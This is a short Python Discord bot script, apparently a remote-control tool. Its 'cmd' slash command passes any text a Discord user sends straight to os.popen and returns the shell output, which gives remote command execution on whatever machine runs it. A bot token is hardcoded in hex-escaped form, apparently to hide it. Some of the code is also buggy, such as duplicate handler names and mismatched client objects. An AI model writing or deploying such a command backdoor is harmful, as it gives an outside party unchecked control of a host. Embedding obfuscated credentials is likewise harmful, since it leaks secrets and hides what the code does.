# from pystyle import *
import os

import discord
from discord import *

"""
@client.event
async def on_message(message):
	channelid = message.channel.id
	name = message.author.name
	tag = "#"+message.author.discriminator
	print (f"channel :{channelid} -> {name}{tag} : {message.content}")
"""

global Token
Token = "\x4d\x54\x41\x78\x4e\x44\x63\x77\x4e\x7a\x51\x33\x4e\x6a\x67\x35\x4e\x54\x45\x78\x4e\x7a\x4d\x33\x4e\x41\x2e\x47\x53\x34\x57\x58\x50\x2e\x72\x41\x37\x62\x6d\x4a\x67\x4d\x6a\x52\x32\x78\x34\x70\x44\x35\x67\x30\x4d\x52\x69\x47\x72\x74\x73\x47\x74\x66\x6d\x2d\x63\x4b\x79\x63\x6e\x42\x46\x73"
client = discord.Client(token=Token, intents=discord.Intents.all())


class Control(discord.Client):
	def __init__(self):
		super().__init__(token=Token, intents=discord.Intents.all())
		self.synced = False

	@staticmethod
	@client.event
	async def on_ready():
		print(f"logged in as [{client.user}]")


bot = Control()
tree = app_commands.CommandTree(bot)


@tree.command(name="cmd", description="execute command in cmd", guild=discord.Object(id=984582818489331732))
async def cmd(interaction: discord.Interaction, command: str):
	await interaction.response.send_message("executing command")
	await interaction.followup.send_message(os.popen(interaction.data["options"][0]["value"]).read())


@tree.command(name="ping", description="replies with pong", guild=discord.Object(id=984582818489331732))
async def cmd(interation: discord.Interaction):
	await interation.response.send_message("Pong")


client.run(Token)
